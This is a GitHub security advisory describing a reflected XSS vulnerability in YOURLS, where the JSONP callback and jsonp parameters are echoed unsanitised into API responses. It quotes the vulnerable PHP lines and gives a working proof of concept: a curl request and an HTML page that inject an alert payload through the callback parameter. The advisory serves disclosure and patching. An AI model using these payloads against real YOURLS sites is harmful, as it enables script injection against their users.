# [H] YOURLS is vulnerable to XSS through JSONP and Callback request parameters

## Summary
Severity: High
Advisory: GHSA-6mp4-q625-mxjp
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2025-12-30
Source: https://github.com/advisories/GHSA-6mp4-q625-mxjp
Type: github-advisory

## Affected
- Packagist: `yourls/yourls` — affected >=0

## Details
### Summary

The callback and **jsonp** request parameters are directly concatenated into the response without any sanitization that allowing attackers to inject arbitrary JS code. When **YOURLS_PRIVATE** is set to **false** (public API mode), this vulnerability can be exploited by any unauthenticated attacker. In private mode, the XSS payload is still injected into the 403 response body though browser execution is blocked.

### Details

Vulnerability exists in the JSONP callback handling chain:

```
yourls-api.php:127-128

if( isset( $_REQUEST['callback'] ) )
    $return['callback'] = $_REQUEST['callback'];
elseif ( isset( $_REQUEST['jsonp'] ) )
    $return['callback'] = $_REQUEST['jsonp']; 
```
---

```
includes/functions-api.php:127-128

$callback = isset( $output['callback'] ) ? $output['callback'] : '';
$result =  $callback . '(' . json_encode( $output ) . ')';
```

### PoC

I. YOURLS instance with YOURLS_PRIVATE set to false in config.php or user authenticated to a private YOURLS instance.

II. `curl "http://localhost:8080/yourls-api.php?action=version&format=jsonp&callback=alert(document.domain)//"
`
**Expected response:** `alert(document.domain)//({"version":"1.10.2","callback":"alert(document.domain)\/\/"})`

Browser PoC file:

```
<!DOCTYPE html>
<html>
<head><title>pwn</title></head>
<body>
<h1>pwn</h1>
<script src="http://localhost:8080/yourls-api.php?action=version&format=jsonp&callback=alert('pwn');//"></script>
</body>
</html>
```

### Impact

Public Mode (YOURLS_PRIVATE=false): Full exploitation, any unauthenticated user can trigger **XSS.**
Private Mode (YOURLS_PRIVATE=true): XSS payload is injected into 403 response body but browser blocks script execution. However, authenticated users or admins accessing malicious links are still vulnerable.

## References
- https://github.com/YOURLS/YOURLS/security/advisories/GHSA-6mp4-q625-mxjp
- https://github.com/YOURLS/YOURLS/commit/b1c6100e0aa6fef58c9c1a394ccc19352c3a480a
- https://github.com/YOURLS/YOURLS
